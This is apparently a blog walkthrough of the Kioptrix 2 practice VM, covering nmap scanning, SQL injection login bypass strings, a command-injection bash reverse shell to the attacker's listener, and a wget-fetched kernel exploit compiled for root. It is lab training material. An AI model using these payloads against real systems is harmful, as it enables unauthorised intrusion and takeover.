
Kioptrix 2 is the second web application hacking challenge created by Loneferret. If you need help setting up your VM see some of my troubleshooting tips in [my Kioptrix 1 Walkthrough]().

### Step 1: Recon

After you get both your target VM (Kioptrix2) and your attacker VM (Kali/Parrot/etc.) spun up, the first step is going to be to identify your IP addresses. Start by running an **ifconfig** on your Kali Machine.
![](/images/kioptrix2/kioptrix2-1.png)


Next let's use **nmap** to run a ping sweep on the local network. This is a quieter scan that the typical 1000 port nmap scan and uses ICMP echo requests to identify live hosts on the network. We're typically going to use the first three octets of the IP address we discovered in the step above followed by 0/24. So for example:
![](/images/kioptrix2/kioptrix2-2.png)

We can see a few hosts pop up on this scan. Generally you can eliminate the highest and lowest IPs since they're usually virtualized network appliances. The other two IPs end in .133 (which we know is the attacking machine) and .128 (which is most likely our target). To test this theory, plug the target IP address into a browser on your attacker machine. You should see a simple login page.
![](/images/kioptrix2/kioptrix2-4.png)

Great! Now that we have identified our attacker and target IP addresses, lets start enumerating the open ports and running services on the target VM. I like to start with an nmap "Syn Scan" (-sS) which sends syn requests (Step one in the TCP three way handshake) to identify open ports.
![](/images/kioptrix2/kioptrix2-3.png)

Another helpful nmap scan to run is the "Version scan" (-sV), which will grab banners of running services to find out their versions. It's also has the benefit of returning very clean looking results, cleaner than the intensive "advanced scan" (-A).

![](/images/kioptrix2/kioptrix2-12.png)


### Step 2: Poke the Bear

Now that we know a little bit more about our target, let's go back to inspecting the web page with the login form.
We know that the target has a MySQL port open. Why don't we try some classic SQL injection authentication bypasses?

My two favorite cheat sheets for SQL Authentication bypass are: 
- [Pentest Lab Blog](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
- [Netsparker Blog](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

If you've never tried this before, take a minute to look over the two links above and try a few methods yourself.

There are several methods that will work here:
`admin' 1=1 -- \`

`admin' 1=1 #`

`admin' #`


### Step 3: Get in the Bear's House

Now that we've bypassed the login screen we're at a page with a tool that accepts user input and runs a ping scan.

![](/images/Kioptrix2/kiotrix2-5.png)


The concept behind command injection is similar to sqlinjection. Instead of passing some input and using a comment character to stop the rest of sql query, we're going to try some special characters used to string together commands.
; will allow you to escape the underlying program and pass commands
You can even string together multiple multiple commands with &&



Let's see if we can get a bash reverse shell.

For a great reverse shell cheat sheet check out the [Pentest Monkey Blog](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
Start by setting up a netcat listener on your attacker machine. 
` nc -nvlp 4444`

And then pass the reverse shell script into the ping tool.

`; bash -i >& /dev/tcp/192.168.65.133/4444 0>&1`

![](/images/kioptrix2/kioptrix2-6.png)
Boom! We've got our low priv shell.

### Step 4: Own the Bear
Next we begin enumerating more about the machine to plan our privesc approach.
I usually start by gathering information about the OS version, kernel version, and users.
![](/images/kioptrix2/kioptrix2-7.png)

CentOS 4.5 final has the following exploit:
[https://www.exploit-db.com/exploits/9542/]

Since I have my vulnerable VM set up in Host Only mode to segregate it from the internet, I spool up a simple python web sever on my attacker machine with the exploit file in it.

![](/images/kioptrix2/kioptrix2-8.png)
I then use the wget command on my target machine to download the exploit from my attacker.
![](/images/kioptrix2/kioptrix2-9.png)

There are no special insructions in this exploit for compiling the code, so we use the most basic gcc compile.
`**gcc kioptrix2.c -o kioptrix2**`

Then all that's left to do is to run the exploit on the target
![](/images/kioptrix2/kioptrix2-10.png)

Root shell!! 

Thanks for reading. Check back next week for a writeup of Kioptrix 3.







